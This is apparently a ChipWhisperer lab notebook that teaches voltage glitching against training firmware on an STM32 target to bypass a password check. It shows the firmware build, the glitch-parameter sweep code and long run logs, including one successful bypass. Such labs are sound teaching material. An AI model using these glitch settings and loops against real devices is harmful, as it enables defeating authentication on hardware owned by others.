Part 2, Topic 2: Voltage Glitching to Bypass Password
=====================================================



**SUMMARY:** *We’ve seen how voltage glitching can be used to corrupt
calculations, just like clock glitching. Let’s continue on and see if it
can also be used to break past a password check.*

**LEARNING OUTCOMES:**

-  Applying previous glitch settings to new firmware
-  Checking for success and failure when glitching

Firmware
--------

Again, we’ve already covered this lab, so it’ll be mostly up to you!


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM"
    cd ../../../hardware/victims/firmware/simpleserial-glitch
    make PLATFORM=$1 CRYPTO_TARGET=NONE


**Out [2]:**



.. parsed-literal::

    SS_VER set to SS_VER_1_1
    rm -f -- simpleserial-glitch-CWLITEARM.hex
    rm -f -- simpleserial-glitch-CWLITEARM.eep
    rm -f -- simpleserial-glitch-CWLITEARM.cof
    rm -f -- simpleserial-glitch-CWLITEARM.elf
    rm -f -- simpleserial-glitch-CWLITEARM.map
    rm -f -- simpleserial-glitch-CWLITEARM.sym
    rm -f -- simpleserial-glitch-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- simpleserial-glitch.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- simpleserial-glitch.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- simpleserial-glitch.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    Welcome to another exciting ChipWhisperer target build!!
    arm-none-eabi-gcc.exe (GNU Arm Embedded Toolchain 9-2020-q2-update) 9.3.1 20200408 (release)
    Copyright (C) 2019 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: simpleserial-glitch.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-glitch.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch.o.d simpleserial-glitch.c -o objdir/simpleserial-glitch.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: simpleserial-glitch-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-glitch.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch-CWLITEARM.elf.d objdir/simpleserial-glitch.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output simpleserial-glitch-CWLITEARM.elf --specs=nano.specs --specs=nosys.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=simpleserial-glitch-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: simpleserial-glitch-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CWLITEARM.elf simpleserial-glitch-CWLITEARM.hex
    .
    Creating load file for EEPROM: simpleserial-glitch-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    --change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CWLITEARM.elf simpleserial-glitch-CWLITEARM.eep \|\| exit 0
    .
    Creating Extended Listing: simpleserial-glitch-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z simpleserial-glitch-CWLITEARM.elf > simpleserial-glitch-CWLITEARM.lss
    .
    Creating Symbol Table: simpleserial-glitch-CWLITEARM.sym
    arm-none-eabi-nm -n simpleserial-glitch-CWLITEARM.elf > simpleserial-glitch-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       5232	      8	   1296	   6536	   1988	simpleserial-glitch-CWLITEARM.elf
    +--------------------------------------------------------
    + Default target does full rebuild each time.
    + Specify buildtarget == allquick == to avoid full rebuild
    +--------------------------------------------------------
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm \(STM32F3\) with:
    + CRYPTO_TARGET = NONE
    + CRYPTO_OPTIONS = 
    +--------------------------------------------------------
    



**In [3]:**

.. code:: ipython3

    %run "../../Setup_Scripts/Setup_Generic.ipynb"


**Out [3]:**



.. parsed-literal::

    Serial baud rate = 38400
    INFO: Found ChipWhisperer😍
    



**In [4]:**

.. code:: ipython3

    fw_path = "../../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
    cw.program_target(scope, prog, fw_path)


**Out [4]:**



.. parsed-literal::

    Serial baud rate = 115200
    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 5239 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 5239 bytes
    Serial baud rate = 38400
    



**In [5]:**

.. code:: ipython3

    if PLATFORM == "CWLITEXMEGA":
        scope.clock.clkgen_freq = 32E6
        target.baud = 38400*32/7.37
        def reboot_flush():            
            scope.io.pdic = False
            time.sleep(0.1)
            scope.io.pdic = "high_z"
            time.sleep(0.1)
            #Flush garbage too
            target.flush()
    else:
        scope.clock.clkgen_freq = 24E6
        target.baud = 38400*24/7.37
        def reboot_flush():            
            scope.io.nrst = False
            time.sleep(0.05)
            scope.io.nrst = "high_z"
            time.sleep(0.05)
            #Flush garbage too
            target.flush()


**Out [5]:**



.. parsed-literal::

    Serial baud rate = 125047.48982360923
    



**In [6]:**

.. code:: ipython3

    #Do glitch loop
    reboot_flush()
    pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
    target.simpleserial_write('p', pw)
    
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
    valid = val['valid']
    if valid:
        response = val['payload']
        raw_serial = val['full_response']
        error_code = val['rv']
    
    print(val)


**Out [6]:**



.. parsed-literal::

    {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\n', 'rv': 1}
    



**In [7]:**

.. code:: ipython3

    scope.glitch.clk_src = "clkgen" # set glitch input clock
    scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch
    scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
    if PLATFORM == "CWLITEXMEGA":
        scope.io.glitch_lp = True
        scope.io.glitch_hp = True
    elif PLATFORM == "CWLITEARM":
        scope.io.glitch_lp = True
        scope.io.glitch_hp = True
    elif PLATFORM == "CW308_STM32F3":
        scope.io.glitch_hp = True
        scope.io.glitch_lp = True


**In [8]:**

.. code:: ipython3

    import matplotlib.pylab as plt
    import chipwhisperer.common.results.glitch as glitch
    gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
    gc.display_stats()


**Out [8]:**














**In [9]:**

.. code:: ipython3

    from importlib import reload
    import chipwhisperer.common.results.glitch as glitch
    from tqdm.notebook import tqdm
    import re
    import struct
    
    g_step = 0.2
    if PLATFORM=="CWLITEXMEGA":
        gc.set_range("width", 45.7, 47.8)
        gc.set_range("offset", 2.8, 10)
        scope.glitch.repeat = 10
    elif PLATFORM == "CWLITEARM":
        #should also work for the bootloader memory dump
        gc.set_range("width", 34.7, 36)
        gc.set_range("offset", -41, -30)
        scope.glitch.repeat = 7
    elif PLATFORM == "CW308_STM32F3":
        #these specific settings seem to work well for some reason
        #also works for the bootloader memory dump
        gc.set_range("ext_offset", 11, 31)
        gc.set_range("width", 47.6, 49.6)
        gc.set_range("offset", -19, -21.5)
        scope.glitch.repeat = 5
    
    
    gc.set_range("ext_offset", 11, 31)
    
    gc.set_global_step(g_step)
    scope.adc.timeout = 0.1
    
    reboot_flush()
    sample_size = 1
    successes = 0
    
    for glitch_settings in gc.glitch_values():
        scope.glitch.offset = glitch_settings[1]
        scope.glitch.width = glitch_settings[0]
        scope.glitch.ext_offset = glitch_settings[2]
        if scope.adc.state:
            # can detect crash here (fast) before timing out (slow)
            print("Trigger still high!")
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            reboot_flush()
    
        scope.arm()
        target.simpleserial_write('p', bytearray([0]*5))
        scope.io.glitch_hp = False
        scope.io.glitch_hp = True
        scope.io.glitch_lp = False
        scope.io.glitch_lp = True
        ret = scope.capture()
    
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
        if ret:
            print('Timeout - no trigger')
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
    
            #Device is slow to boot?
            reboot_flush()
    
        else:
            if val['valid'] is False:
                gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            else:
                if val['rv'] == 1: #for loop check
                    successes +=1 
                    gc.add("success", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                    print(val)
                    print(val['payload'])
                    print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                    print("🐙", end="")
                else:
                    gc.add("normal", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))


**Out [9]:**



.. parsed-literal::

    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    




.. parsed-literal::

    Trigger still high!
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    




.. parsed-literal::

    ERROR:root:Target did not ack
    




.. parsed-literal::

    Trigger still high!
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout - no trigger
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\n', 'rv': 1}
    CWbytearray(b'01')
    35.15625 -39.0625 29
    🐙Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
